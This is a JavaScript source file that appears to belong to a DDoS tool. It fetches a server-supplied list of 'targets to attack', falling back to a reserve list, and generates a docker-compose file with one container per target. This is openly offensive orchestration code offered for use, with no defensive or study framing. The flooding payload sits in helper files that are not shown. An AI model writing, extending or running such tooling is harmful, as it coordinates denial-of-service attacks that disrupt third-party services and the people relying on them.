const fs = require('fs');

import { RESERVE_DDOS_TARGETS } from '../constants/DDOS_TARGETS.js'
import { generateContainerItem } from './generateContainerItem.js'
import { fetchTargets } from "../fetch.js";

fetchTargets().then(SERVER_DDOS_TARGETS => {
    console.log('--------------------- TARGETS TO ATTACK ---------------------')
    console.log(SERVER_DDOS_TARGETS)
    const dockerComposeHeader = '' +
        'version: "3"\n' +
        '\n' +
        'services:'

    let arrayOfStrings = [dockerComposeHeader]
    SERVER_DDOS_TARGETS.forEach((target) => {
        arrayOfStrings.push(generateContainerItem(target))
    })
    const readyFile = arrayOfStrings.join('')
    fs.writeFile(
        'docker-compose.yml',
        readyFile,
        (e) => {
            if (e) { throw e }
        }
    )
}).catch(() => {
    console.log('--------------------- TARGETS TO ATTACK ---------------------')
    console.log(RESERVE_DDOS_TARGETS)
    const dockerComposeHeader = '' +
        'version: "3"\n' +
        '\n' +
        'services:'

    let arrayOfStrings = [dockerComposeHeader]
    RESERVE_DDOS_TARGETS.forEach((target) => {
        arrayOfStrings.push(generateContainerItem(target))
    })
    const readyFile = arrayOfStrings.join('')
    fs.writeFile(
        'docker-compose.yml',
        readyFile,
        (e) => {
            if (e) { throw e }
        }
    )
})